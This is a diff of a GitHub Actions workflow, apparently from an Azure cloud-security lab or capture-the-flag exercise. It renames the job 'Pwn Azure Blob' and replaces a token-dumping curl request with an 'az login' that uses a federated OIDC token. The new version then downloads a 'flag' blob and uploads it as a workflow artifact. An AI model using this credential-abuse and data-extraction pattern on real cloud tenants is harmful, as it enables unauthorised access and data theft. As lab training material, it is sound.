@@ -1,4 +1,4 @@
-name: Get Azure Access Token
+name: Pwn Azure Blob
 
 on:
   workflow_dispatch:
@@ -8,30 +8,44 @@ permissions:
   contents: read
 
 jobs:
-  dump-token:
+  blob-access:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Get ID Token for Federated Identity
-        id: get_oidc
+      - name: Get OIDC Token
+        id: oidc
         uses: actions/github-script@v6
         with:
           script: |
             const id_token = await core.getIDToken("api://AzureADTokenExchange");
             core.setOutput("id_token", id_token);
 
-      - name: Request Access Token from Azure
-        id: get_az_token
+      - name: Log into Azure via Federated Identity
         run: |
-          ID_TOKEN="${{ steps.get_oidc.outputs.id_token }}"
+          echo "${{ steps.oidc.outputs.id_token }}" > oidc_token.txt
 
-          ACCESS_TOKEN=$(curl -s -X POST \
-            -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "client_id=c265ea2a-1235-446d-bd74-5d8228c904b1" \
-            -d "grant_type=client_credentials" \
-            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-            -d "client_assertion=${ID_TOKEN}" \
-            -d "scope=https://management.azure.com/.default" \
-            "https://login.microsoftonline.com/fdd066e1-ee37-49bc-b08f-d0e152119b04/oauth2/v2.0/token" | jq -r '.access_token')
+          az login --service-principal \
+            --username c265ea2a-1235-446d-bd74-5d8228c904b1 \
+            --tenant fdd066e1-ee37-49bc-b08f-d0e152119b04 \
+            --federated-token "$(cat oidc_token.txt)"
 
-          echo "$ACCESS
+      - name: List Blobs and Grab the Flag
+        run: |
+          az storage blob list \
+            --account-name iamazurelab3d26800f7 \
+            --container-name flag \
+            --auth-mode login \
+            --output table
+
+          az storage blob download \
+            --account-name iamazurelab3d26800f7 \
+            --container-name flag \
+            --name flag.txt \
+            --file flag.txt \
+            --auth-mode login
+
+      - name: Upload the Flag Artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: azure-flag
+          path: flag.txt
